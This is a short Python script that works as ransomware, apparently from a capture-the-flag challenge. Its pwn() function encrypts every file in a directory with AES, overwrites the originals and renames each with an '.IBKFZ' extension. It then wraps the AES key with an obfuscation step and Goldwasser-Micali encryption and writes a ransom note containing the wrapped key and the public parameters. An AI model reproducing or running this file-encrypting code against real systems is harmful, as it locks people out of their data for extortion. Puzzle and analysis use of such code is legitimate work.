from Crypto import Random
from encryption import *
import os

MBEGIN = "---BEGIN MORPHEUS KEY---"
MEND = "---END MORPHEUS KEY---"

GBEGIN = "----BEGIN GPUBLIC KEY---"
GEND = "---END GPUBLIC KEY---"

with open("note.txt", "r") as f:
    note = f.read()

aes = AESP()
gm = GM()
obf = OBF()


def encrypt(key):
    obf_key = obf.obfuscate(key)
    enc_key = gm.encrypt(obf_key)
    return enc_key


def pwn(directory):
    for file in os.listdir(directory):
        file = directory + "/" + file
        with open(file, "rb") as f:
            data = f.read()
        enc_data = aes.encrypt(data)
        with open(file, "wb") as f:
            f.write(enc_data)
        os.rename(file, file + r'.IBKFZ')


# Here will be the flag and other files
pwn("sensitive_data")
enc_key = encrypt(aes.key)
enc_key = "\n".join([str(x) for x in enc_key])

with open("sensitive_data/custom_note.txt", "w") as f:
    data = note + "\n"
    data += MBEGIN + "\n"
    data += enc_key + "\n"
    data += MEND + "\n"

    data += "\n"

    data += GBEGIN + "\n"
    data += hex(gm.n)[2:] + "\n"
    data += hex(gm.x)[2:] + "\n"
    data += GEND
    f.write(data)
